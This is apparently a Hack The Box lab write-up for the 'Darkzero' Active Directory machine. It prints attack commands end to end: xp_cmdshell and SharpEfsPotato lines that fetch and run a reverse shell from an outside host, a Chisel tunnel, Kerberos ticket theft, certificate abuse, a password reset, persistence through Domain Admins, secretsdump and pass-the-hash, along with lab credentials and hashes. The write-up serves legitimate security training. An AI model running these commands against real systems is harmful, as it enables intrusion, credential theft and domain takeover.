---
title: HTB Darkzero
slug: darkzero
lang: en
platform: Hack The Box
category: Active Directory
headline: MSSQL links, Kerberos certificate abuse, token impersonation and unconstrained delegation
difficulty: Hard
objective: Domain Admin
date: 2026-05-08
tags: [Active Directory, MSSQL, Chisel, Rubeus, AD CS, Unconstrained Delegation]
---

# HTB Darkzero

## Executive Summary

Darkzero begins with valid credentials for `john.w`. MSSQL access exposes a linked SQL server, where `xp_cmdshell` provides command execution on a second domain controller. A reverse shell and Chisel tunnel make the internal host reachable. Kerberos ticket delegation and certificate abuse are then used to gain stronger control over `svc_sql`. After local privilege escalation to SYSTEM on DC02, unconstrained delegation is abused to capture a DC01 machine ticket and dump the Administrator hash from the primary domain controller.

## Initial Credentials and MSSQL Access

```text
john.w / RFulUtONCOL!
```

Port scanning showed a Windows Active Directory environment with MSSQL and WinRM exposed.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.64.24 -oG allPorts
```

After adding `darkzero.htb` and `DC01.darkzero.htb` to `/etc/hosts`, MSSQL authentication succeeded.

```bash
mssqlclient.py -windows-auth 'darkzero.htb'/'john.w':'RFulUtONCOL!'@10.129.64.24
```

![[Pasted image 20260507195215.png|MSSQL port identified]]
![[Pasted image 20260507195522.png|Valid credentials confirmed]]
![[Pasted image 20260507210133.png|MSSQL login]]

## Linked SQL Server and Reverse Shell

SQL links revealed access to `DC02.darkzero.ext`.

```sql
enum_links
use_link "DC02.darkzero.ext"
enable_xp_cmdshell
```

![[Pasted image 20260507210446.png|MSSQL links enumeration]]
![[Pasted image 20260507210747.png|Using DC02 SQL link]]
![[Pasted image 20260507210936.png|xp_cmdshell enabled]]
![[Pasted image 20260507211051.png|Command execution test]]

A PowerShell reverse shell was executed through `xp_cmdshell`.

```sql
xp_cmdshell powershell iex(iwr -uri http://10.10.17.23/revshell.ps1 -UseBasicParsing)
```

![[Pasted image 20260507212317.png|Reverse shell preparation]]
![[Pasted image 20260507213250.png|xp_cmdshell reverse shell execution]]
![[Pasted image 20260507213423.png|Shell callback]]
![[Pasted image 20260507213756.png|Initial shell context]]

## Pivoting and Kerberos Material

Because DC02 was internal, Chisel was used to create a reverse SOCKS tunnel.

```bash
./chisel server --reverse -p 8080
iwr -uri http://10.10.17.23/chisel.exe -o C:\windows\tasks\chisel.exe
Start-Process "C:\windows\tasks\chisel.exe" -ArgumentList "client 10.10.17.23:8080 R:socks"
```

![[Pasted image 20260507214857.png|Chisel server]]
![[Pasted image 20260507215231.png|Chisel download on victim]]
![[Pasted image 20260507220145.png|Chisel client execution]]
![[Pasted image 20260507220324.png|Proxychains session]]

Rubeus was used to obtain a delegated TGT for `svc_sql`, which was converted to a ccache.

```cmd
C:\windows\tasks\Rubeus.exe tgtdeleg /nowrap
```

```bash
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi
ticketConverter.py svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache
```

![[Pasted image 20260507221037.png|Rubeus upload]]
![[Pasted image 20260507221238.png|tgtdeleg output]]
![[Pasted image 20260507221708.png|Kirbi extraction]]
![[Pasted image 20260507221903.png|Ticket conversion]]
![[Pasted image 20260507222031.png|KRB5CCNAME export]]

## Certificate Abuse and Password Reset

Using the Kerberos ticket, a certificate was requested from the CA on DC02.

```bash
proxychains certipy req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca 'darkzero-ext-DC02-CA' -template 'user'
```

![[Pasted image 20260507224857.png|Certificate request as svc_sql]]
![[Pasted image 20260507225234.png|svc_sql NTLM recovered]]

The `svc_sql` password was reset to a known value.

```bash
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","Password1!".encode("utf-16le")).digest()).decode())'
proxychains changepasswd.py -hashes :816ccb849956b531db139346751db65f -newhash :7facdc498ed1680c4fd1448319a8c04f 'darkzero.ext/svc_sql'@dc02.darkzero.ext
```

![[Pasted image 20260507225624.png|New NT hash for Password1]]
![[Pasted image 20260507230055.png|Password change]]
![[Pasted image 20260507230345.png|Password validation]]

## SYSTEM on DC02 and Domain Admin Persistence

`Invoke-RunasCs` was used to get a better session as `svc_sql`.

```powershell
Invoke-RunasCs -Username svc_sql -Password 'Password1!' -LogonType 5 -BypassUAC -Command powershell.exe -Remote 10.10.17.23:1337
```

![[Pasted image 20260508121733.png|RunasCs listener]]
![[Pasted image 20260508121819.png|RunasCs execution]]
![[Pasted image 20260508122215.png|Impersonation privileges]]

SharpEfsPotato was then used to obtain SYSTEM on DC02.

```cmd
C:\Windows\Tasks\SharpEfsPotato.exe -a '/c powershell.exe -c IEX(iwr -uri http://10.10.17.23/revshell.ps1 -UseBasicParsing)'
```

![[Pasted image 20260508123637.png|SharpEfsPotato upload]]
![[Pasted image 20260508125728.png|SharpEfsPotato execution]]
![[Pasted image 20260508125841.png|SYSTEM shell on DC02]]

The account was added to Domain Admins.

```cmd
net group "Domain Admins" svc_sql /add /domain
```

![[Pasted image 20260508130419.png|Domain Admins persistence]]
![[Pasted image 20260508130830.png|Domain Admin validation]]

## Unconstrained Delegation to DC01

From DC02, Rubeus monitor captured a DC01 machine TGT after coercing authentication from DC01 via MSSQL `xp_dirtree`.

```cmd
C:\Windows\Tasks\rubeus.exe monitor /interval:5 /nowrap
```

```sql
xp_dirtree \\dc02.darkzero.ext\c$
```

![[Pasted image 20260508132039.png|Stable psexec session]]
![[Pasted image 20260508133346.png|Rubeus monitor]]
![[Pasted image 20260508133822.png|Coercing DC01 authentication]]
![[Pasted image 20260508133919.png|Captured DC01 TGT]]

The TGT was converted and used with SecretsDump to obtain the Administrator hash.

```bash
cat DC01\$.kirbi.b64 | base64 -d > DC01$.kirbi
ticketConverter.py DC01$.kirbi DC01$.ccache
export KRB5CCNAME=DC01\$.ccache
secretsdump.py -just-dc-user Administrator -k dc01.darkzero.htb
```

![[Pasted image 20260508134224.png|DC01 ticket conversion]]
![[Pasted image 20260508134716.png|Administrator hash from DC01]]

The final Administrator hash allowed WinRM access to DC01.

```bash
evil-winrm -i 10.129.64.87 -u 'Administrator' -H '5917507bdf2ef2c2b0a869a1cba40726'
```

![[Pasted image 20260508134929.png|Administrator shell on DC01]]
![[Pasted image 20260508135128.png|Flags recovered]]

## Key Takeaways

- MSSQL links can provide a bridge between isolated systems.
- Reverse tunnels are often required to operate inside segmented networks.
- Kerberos ticket conversion enables Linux tooling against Windows internal infrastructure.
- Unconstrained delegation can turn machine account coercion into full domain compromise.
